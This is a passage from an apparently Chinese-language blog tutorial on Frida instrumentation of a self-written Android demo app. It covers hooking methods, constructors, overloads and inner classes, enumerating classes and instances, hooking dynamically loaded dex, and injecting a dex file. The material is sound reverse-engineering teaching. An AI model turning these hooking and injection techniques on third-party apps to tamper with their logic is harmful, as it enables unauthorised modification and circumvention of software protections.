class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zyc.fridademo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">(<span class="type">int</span> p1)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.base = p1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 普通方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> num1与base相加结果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> num1)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base + num1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141738864.gif" alt="img"> </p><h1 id="0x01hook普通函数"><a href="#0x01hook普通函数" class="headerlink" title="0x01hook普通函数"></a>0x01hook普通函数</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var clazz = Java.use(&quot;com.zyc.fridademo.Calc&quot;);</span></span><br><span class="line"><span class="string">    clazz.add.implementation = function(p1)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        console.log(&quot;Hook开始...&quot;);</span></span><br><span class="line"><span class="string">        send(&quot;原p1=&quot;+p1);</span></span><br><span class="line"><span class="string">        console.log(&quot;Hook修改参数...&quot;);</span></span><br><span class="line"><span class="string">        p1+=100;</span></span><br><span class="line"><span class="string">        send(&quot;现p1=&quot;+p1);</span></span><br><span class="line"><span class="string">        return this.add(p1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>(<span class="params">message , data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process=frida.get_remote_device().attach(<span class="string">&#x27;com.zyc.fridademo&#x27;</span>)</span><br><span class="line">script=process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>启动frida-server，使用端口转发，执行上面的脚本，即可实现输入的数增加100之后再执行原函数。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141758219.gif" alt="img"> </p><h1 id="0x02-Hook构造函数"><a href="#0x02-Hook构造函数" class="headerlink" title="0x02 Hook构造函数"></a>0x02 Hook构造函数</h1><p>如果是Hook构造函数，只需使用$init引用，将.py的js部分修改为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">p1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook构造开始...&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;原p1=&quot;</span>+p1);</span><br><span class="line">        p1+=<span class="number">200</span>;</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;现p1=&quot;</span>+p1);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.$init(p1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141803614.gif" alt="img"> </p><h1 id="0x03-Hook重载函数"><a href="#0x03-Hook重载函数" class="headerlink" title="0x03 Hook重载函数"></a>0x03 Hook重载函数</h1><p>在Calc类中增加一个重载方法add(int num1,String num2)：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> num1,String num2)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> base + num1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于Calc中有add(int num1)和add(int num1,String num2)，像普通函数那样Hook是会报错的，涉及到重载就要用到 <strong>overload()</strong> ：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">add</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook add(int num1)...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">888</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clazz.<span class="property">add</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>,<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook add(int num1,String num2)...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">999</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141807919.gif" alt="img"> </p><p>如果重载函数多，可以通过 overloads 获得全部重载对象，并通过js的 <strong>apply</strong> 和 <strong>arguments</strong> 特性继续程序流程。下面例子遍历了add(int a)和add(int a,String b)函数，并修改了两个函数的第一个参数，打印了第二个参数（如果有）。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> count = clazz.<span class="property">add</span>.<span class="property">overloads</span>.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;count;i++)&#123;</span><br><span class="line">        clazz.<span class="property">add</span>.<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">arguments</span>[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="title function_">send</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">add</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141808583.gif" alt="img"> </p><h1 id="0x04-实例化类"><a href="#0x04-实例化类" class="headerlink" title="0x04 实例化类"></a>0x04 实例化类</h1><p>使用 <strong>$new()</strong> 可以实例化一个类，这里我们在MainActivity onCreate()时实例化一个Calc，构造方法传入10（按钮实例化的传入的是1）：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> calc = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">onCreate</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook MainActivity onCreate()...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> myCalc = calc.$new(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">onCreate</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141811689.gif" alt="img"> </p><h1 id="0x05-访问类的属性"><a href="#0x05-访问类的属性" class="headerlink" title="0x05 访问类的属性"></a>0x05 访问类的属性</h1><p>类的属性可通过 <strong>.属性名.value</strong> 访问。如果有函数与属性名相同，则需要使用下划线方式 <strong>._属性名.value</strong> 访问。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> calc = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">onCreate</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook MainActivity onCreate()...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> myCalc = calc.$new(<span class="number">10</span>);</span><br><span class="line">        <span class="title function_">send</span>(myCalc.<span class="property">base</span>.<span class="property">value</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;修改一下base...&quot;</span>);</span><br><span class="line">        myCalc.<span class="property">base</span>.<span class="property">value</span> = <span class="number">88</span>;</span><br><span class="line">        <span class="title function_">send</span>(myCalc.<span class="property">base</span>.<span class="property">value</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">onCreate</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141813848.gif" alt="img"> </p><h1 id="0x06-hook内部类"><a href="#0x06-hook内部类" class="headerlink" title="0x06 hook内部类"></a>0x06 hook内部类</h1><p>使用 <strong>外部类$内部类</strong> 的写法可以实现内部类Hook，为了测试简单改写一下程序：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Calc类中增加静态内部类InnerClass</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">InnerClass</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我是内部类&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//MainActivity的onCreate()中加入一个按钮，点击触发InnerClass的print()方法</span></span><br><span class="line">btnInnerClass = findViewById(R.id.btn_inner_class);</span><br><span class="line">btnInnerClass.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">txt</span> <span class="operator">=</span> Calc.InnerClass.print();</span><br><span class="line">        Toast.makeText(MainActivity.<span class="built_in">this</span>, txt, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Hook代码，修改print()方法的返回值：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> innerClazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc$InnerClass&quot;</span>);</span><br><span class="line">    innerClazz.<span class="property">print</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我是被hook的内部类&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141814337.gif" alt="img"> </p><h1 id="0x07-Hook匿名类"><a href="#0x07-Hook匿名类" class="headerlink" title="0x07 Hook匿名类"></a>0x07 Hook匿名类</h1><p>看过smali的都知道匿名类反编译出来是 类$数字 形式，如上面调用内部类方法时创建的View.OnClickListener就是一个匿名类，通过反编译工具能看到其名称为 <strong>MainActivity$1</strong>。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141815880.png" alt="img"> </p><p>于是可以利用frida来监听View.OnclickListener方法</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> innerClazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.MainActivity$1&quot;</span>);</span><br><span class="line">    innerClazz.<span class="property">onClick</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;执行了匿名类点击方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141815815.gif" alt="img"> </p><h1 id="0x08-遍历已加载的类与类方法"><a href="#0x08-遍历已加载的类与类方法" class="headerlink" title="0x08 遍历已加载的类与类方法"></a>0x08 遍历已加载的类与类方法</h1><p>用 <strong>enumerateLoadedClasses</strong> 可以异步获取已加载的类，再通过类名反射即可获得类方法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">        onMatch : <span class="keyword">function</span>(<span class="params">name,handle</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(name.<span class="title function_">indexOf</span>(<span class="string">&quot;com.zyc.fridademo&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">                <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(name);</span><br><span class="line">                <span class="keyword">var</span> methods = clazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;methods.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141816498.png" alt="img"> </p><p>这里引申一下用 <strong>类变量[方法名]</strong> 方式的Hook：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> innerClazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc$InnerClass&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> methods = innerClazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;methods.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> methodName = methods[i].<span class="title function_">getName</span>();</span><br><span class="line">        <span class="keyword">if</span>(methodName.<span class="title function_">indexOf</span>(<span class="string">&quot;print&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">            innerClazz[methodName].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="title function_">send</span>(<span class="string">&quot;我是反射来的&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>运行</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141816090.gif" alt="img"> </p><h1 id="0x09-遍历类实例"><a href="#0x09-遍历类实例" class="headerlink" title="0x09 遍历类实例"></a>0x09 遍历类实例</h1><p>使用 <strong>choose</strong> 可查找堆中的类实例：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> calc = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">onCreate</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook MainActivity onCreate()...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化3个Calc</span></span><br><span class="line">        calc.$new(<span class="number">2</span>);</span><br><span class="line">        calc.$new(<span class="number">3</span>);</span><br><span class="line">        calc.$new(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印每个实例的base值</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span> , &#123;</span><br><span class="line">            onMatch : <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found instance: &quot;</span>+instance);</span><br><span class="line">                <span class="title function_">send</span>(<span class="string">&quot;instance.base=&quot;</span>+instance.<span class="property">base</span>.<span class="property">value</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">onCreate</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141819746.png" alt="img"> </p><h1 id="0x10-Hook动态加载dex"><a href="#0x10-Hook动态加载dex" class="headerlink" title="0x10 Hook动态加载dex"></a>0x10 Hook动态加载dex</h1><p>首先写一个供动态加载的jar包放置在data&#x2F;data&#x2F;com.zyc.fridademo&#x2F;files，反编译出来是这样的</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141820652.png" alt="img"> </p><p>上面的案例程序中多加一个按钮来使用该jar包中类，详细流程自行参考DexClassLoader相关知识，这里只展示按钮部分代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> R.id.btn_mydex:</span><br><span class="line">    <span class="comment">//加载dex class</span></span><br><span class="line">    <span class="keyword">if</span> (dexClassLoader==<span class="literal">null</span>)&#123; <span class="comment">//确保只创建一个DexClassLoader，不然多个loader影响hook</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">dexPath</span> <span class="operator">=</span> <span class="built_in">this</span>.getFilesDir() + File.separator + <span class="string">&quot;mydex.jar&quot;</span>;</span><br><span class="line">        dexClassLoader = <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(dexPath, <span class="built_in">this</span>.getFilesDir().getAbsolutePath(), <span class="literal">null</span>, getClassLoader());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clz = dexClassLoader.loadClass(<span class="string">&quot;com.zyc.mydex.Human&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">human</span> <span class="operator">=</span> clz.newInstance() ;</span><br><span class="line">        <span class="keyword">if</span> (human != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">say</span> <span class="operator">=</span> clz.getDeclaredMethod(<span class="string">&quot;say&quot;</span>);</span><br><span class="line">            say.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">what</span> <span class="operator">=</span> String.valueOf(say.invoke(human)); <span class="comment">//反射调用say，返回“我是动态dex”</span></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, what, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>在获取loader时记得使用 <strong>try catch</strong>，否则loadClass()发生异常会导致程序终止。Hook动态dex的关键在于使用正确的loader：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">        onMatch : <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(loader.<span class="title function_">loadClass</span>(<span class="string">&quot;com.zyc.mydex.Human&quot;</span>))&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;正确loader&quot;</span>);</span><br><span class="line">                    <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader;</span><br><span class="line">                    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.mydex.Human&quot;</span>);</span><br><span class="line">                    <span class="title function_">send</span>(clazz);</span><br><span class="line">                    clazz.<span class="property">say</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;我是被hook的动态dex&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141821105.jpeg" alt="img"> </p><h1 id="0x11-打印函数堆栈"><a href="#0x11-打印函数堆栈" class="headerlink" title="0x11 打印函数堆栈"></a>0x11 打印函数堆栈</h1><p>打印函数堆栈的关键在于 <strong>android.util.Log.getStackTraceString(new Throwable())</strong> 或 <strong>android.util.Log.getStackTraceString(new Exception())</strong> ，于是我们可以这样Hook：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">add</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">num</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> log = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> throwable = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> stack = log.<span class="title function_">getStackTraceString</span>(throwable.$new());</span><br><span class="line">        <span class="title function_">send</span>(stack);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">add</span>(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>运行，可以看到除系统调用外，执行流程为 <strong>MainActivity.onCreate -&gt; Calc.add()</strong> ：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141823531.gif" alt="img"> </p><h1 id="0x12-注入dex文件"><a href="#0x12-注入dex文件" class="headerlink" title="0x12 注入dex文件"></a>0x12 注入dex文件</h1><p>当程序本身功能不能满足我们需求时，如果要利用frida增加功能，可以通过下面方法：</p><ul><li><strong>Java.registerClass</strong> 注入自己的类，需要使用js撰写一个java类传入。</li><li><strong>Java.openClassFile</strong> 注入自己的dex文件，只需传入dex路径。</li></ul><p>显然，注入dex文件会方便很多。那么现在我写一个简单的类打包后提取其dex放置为 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;injectiondex.dex：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zyc.injectiondex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;喵喵喵&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;多吃几口&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用frida注入之前的内部类方法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/injectiondex.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">    <span class="keyword">var</span> 